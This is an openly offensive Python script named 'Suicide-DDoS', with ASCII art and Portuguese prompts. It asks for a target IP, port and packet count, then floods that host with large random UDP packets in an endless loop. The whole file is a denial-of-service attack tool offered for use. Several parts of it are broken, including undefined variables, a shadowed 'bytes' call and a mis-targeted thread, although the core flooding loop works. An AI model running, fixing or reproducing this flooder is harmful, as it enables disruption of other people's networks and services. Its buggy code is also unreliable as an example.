import random
import socket
import os
import time
import threading

print("\033[37m Suicide-DDoS  \n  by: t4ucci")
print("""\033[32m
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
""")

print("\033[32mIniciando programa..")

for i in range(3+1):
    time.sleep(1)
    print(f"\033[32m\n{i}..")

print("\033[36m\n   [+]Divirta-se!\n")
 
class SenderBite:
       def __init__(self, host, ports, packets, threadi):
              self.host = host
              self.ports = ports
              self.packets = packets
              self.threadi = threadi

       def start(self):
              bytes = random._urandom(25000)
              envios = 0
              while True:
                     try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            s.connect((ip,port))
                            for i in range(packs):
                                   s.sendto(bytes, (ip, port))
                                   envios += 1
                                   print('\033[35m[*]\033[32mATTACKING NOW: '+ip+' || SENDING FOR: '+str(envios))
                     except:
                            if not packs:
                                   pergunta = str(input("Voltar?: [S/N]"))
                            elif pergunta == 'S':
                                   s.sendto(bytes(ip,port))
                                   envios += 1
                                   print('\033[35m[*]\033[32mATTACKING NOW: '+ip+' || SENDING: '+str(envio))
                            else:
                                   print("\033[35m[♤] O ataque está procedendo...")
                                   s.close()
                                   break
                            s.close()
                            print(">>> O ataque pode fechar em breve!")
                            for x in range(thread):
                                   thred = threading.Thread(target=start)
                                   thred.start()
  
ip = str(input("\033[32m[♤] Endereço: "))
port = int(input("\033[32m[♤] Porta: "))
packs = int(input("\033[32m[♤] Quant. Pacotes: "))
thread = int(input("\033[32m[♤] Velocidade do Envio: "))                                                                         
sender = SenderBite(ip,port,packs,thread)
sender.start()